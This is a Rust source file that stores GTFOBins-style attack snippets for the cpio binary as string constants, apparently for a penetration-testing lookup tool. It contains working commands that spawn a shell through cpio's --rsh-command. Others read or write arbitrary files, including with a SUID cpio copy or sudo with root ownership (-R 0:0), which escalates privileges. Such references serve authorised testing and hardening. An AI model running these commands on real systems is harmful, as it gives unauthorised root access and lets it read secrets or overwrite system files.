pub static BIN_NAME: &'static str = "cpio";
pub static SH_CODE: &'static str = r#"
    
    echo '/bin/sh </dev/tty >/dev/tty' >localhost
    cpio -o --rsh-command /bin/sh -F localhost:
"#;
pub static FW_DESC: &'static str = "Copies `$LFILE` to the `$LDIR` directory.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >$LFILE
    echo $LFILE | cpio -up $LDIR
"#;
pub static FR_DESC_1: &'static str = "The content of the file is printed to standard output, between the cpio archive format header and footer.";
pub static FR_CODE_1: &'static str = r#"
    
    LFILE=file_to_read
    echo "$LFILE" | cpio -o
"#;
pub static FR_DESC_2: &'static str = "The whole directory structure is copied to `$TF`.";
pub static FR_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    TF=$(mktemp -d)
    echo "$LFILE" | cpio -dp $TF
    cat "$TF/$LFILE"
"#;
pub static SUID_DESC_1: &'static str = "The whole directory structure is copied to `$TF`.";
pub static SUID_CODE_1: &'static str = r#"
    
    sudo install -m =xs $(which cpio) .

    LFILE=file_to_read
    TF=$(mktemp -d)
    echo "$LFILE" | ./cpio -R $UID -dp $TF
    cat "$TF/$LFILE"
"#;
pub static SUID_DESC_2: &'static str = "Copies `$LFILE` to the `$LDIR` directory.";
pub static SUID_CODE_2: &'static str = r#"
    
    sudo install -m =xs $(which cpio) .

    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >$LFILE
    echo $LFILE | ./cpio -R 0:0 -p $LDIR
"#;
pub static SUDO_CODE_1: &'static str = r#"
    
    echo '/bin/sh </dev/tty >/dev/tty' >localhost
    sudo cpio -o --rsh-command /bin/sh -F localhost:
"#;
pub static SUDO_DESC_2: &'static str = "The whole directory structure is copied to `$TF`.";
pub static SUDO_CODE_2: &'static str = r#"
    
    LFILE=file_to_read
    TF=$(mktemp -d)
    echo "$LFILE" | sudo cpio -R $UID -dp $TF
    cat "$TF/$LFILE"
"#;
pub static SUDO_DESC_3: &'static str = "Copies `$LFILE` to the `$LDIR` directory.";
pub static SUDO_CODE_3: &'static str = r#"
    
    LFILE=file_to_write
    LDIR=where_to_write
    echo DATA >$LFILE
    echo $LFILE | sudo cpio -R 0:0 -p $LDIR
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SH_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR_1: Code<'static> = Code {
    title: "FR_CODE_1",
    code: FR_CODE_1,
    tag: Tag::FR,
};
pub static FR_2: Code<'static> = Code {
    title: "FR_CODE_2",
    code: FR_CODE_2,
    tag: Tag::FR,
};
pub static SUID_1: Code<'static> = Code {
    title: "SUID_CODE_1",
    code: SUID_CODE_1,
    tag: Tag::SUID,
};
pub static SUID_2: Code<'static> = Code {
    title: "SUID_CODE_2",
    code: SUID_CODE_2,
    tag: Tag::SUID,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static SUDO_3: Code<'static> = Code {
    title: "SUDO_CODE_3",
    code: SUDO_CODE_3,
    tag: Tag::SUDO,
};
